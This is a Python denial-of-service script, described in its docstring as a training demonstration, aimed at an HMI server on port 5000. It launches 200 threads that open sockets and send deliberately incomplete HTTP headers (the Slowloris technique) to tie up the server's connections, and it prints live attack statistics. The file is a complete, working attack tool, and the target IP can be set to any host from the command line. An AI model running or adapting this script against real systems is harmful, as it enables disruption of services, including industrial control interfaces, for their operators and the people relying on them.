#!/usr/bin/env python3
"""
DoS Attack Script for Training Demonstration
Targets the HMI server to demonstrate vulnerability
"""
import socket
import threading
import time
import sys

TARGET_IP = "localhost"  # Change to Windows VM IP
TARGET_PORT = 5000
ATTACK_THREADS = 200  # Increased for realistic impact
ATTACK_DURATION = 60  # seconds

attack_active = True
requests_sent = 0

def attack_worker():
    global requests_sent
    while attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Send incomplete HTTP request to keep connection open (Slowloris)
            s.send(b"GET /api/data HTTP/1.1\r\n")
            s.send(b"Host: " + TARGET_IP.encode() + b"\r\n")
            s.send(b"User-Agent: DoS-Training\r\n")
            # Don't send final \r\n to keep connection open
            
            requests_sent += 1
            time.sleep(10)  # Keep connection alive
            
        except:
            pass
        finally:
            try:
                s.close()
            except:
                pass

def status_monitor():
    start_time = time.time()
    while attack_active:
        elapsed = int(time.time() - start_time)
        print(f"\r[DoS] Active | Threads: {ATTACK_THREADS} | Requests: {requests_sent} | Time: {elapsed}s", end="")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_IP = sys.argv[1]
    
    print(f"[DoS] Starting attack on {TARGET_IP}:{TARGET_PORT}")
    print(f"[DoS] Threads: {ATTACK_THREADS} | Duration: {ATTACK_DURATION}s")
    print("[DoS] Press Ctrl+C to stop\n")
    
    # Start status monitor
    monitor = threading.Thread(target=status_monitor, daemon=True)
    monitor.start()
    
    # Launch attack threads
    threads = []
    for i in range(ATTACK_THREADS):
        t = threading.Thread(target=attack_worker, daemon=True)
        t.start()
        threads.append(t)
    
    try:
        time.sleep(ATTACK_DURATION)
    except KeyboardInterrupt:
        print("\n[DoS] Stopping attack...")
    
    attack_active = False
    time.sleep(2)
    
    print(f"\n[DoS] Attack completed. Total requests: {requests_sent}")
